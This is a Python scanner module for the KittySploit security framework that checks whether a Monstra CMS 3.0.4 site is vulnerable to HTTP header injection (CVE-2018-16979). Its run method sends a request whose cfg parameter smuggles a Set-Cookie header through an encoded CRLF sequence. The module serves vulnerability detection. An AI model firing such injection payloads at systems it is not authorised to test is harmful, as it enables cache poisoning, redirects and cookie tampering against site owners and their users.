#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Monstra CMS 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Monstra CMS 3.0.4 - HTTP Header Injection Detection',
        'description': 'Monstra CMS 3.0.4 is susceptible to HTTP header injection in the plugins/captcha/crypt/cryptographp.php cfg parameter. An attacker can potentially supply invalid input and cause the server to allow redirects to attacker-controlled domains, perform cache poisoning, and/or allow improper access to virtual hosts not intended for this purpose. This is a related issue to CVE-2012-2943.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'crlf', 'mostra', 'mostracms', 'cms', 'monstra', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/howchen/howchen/issues/4',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-16979',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-16979',
    }

    def run(self):
        r = self.http_request(method="GET", path='/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('new line detected in', 'cryptographp.php',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Monstra CMS 3.0.4 - HTTP Header Injection detected",
                path='/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1',
            )
            return True
        return False

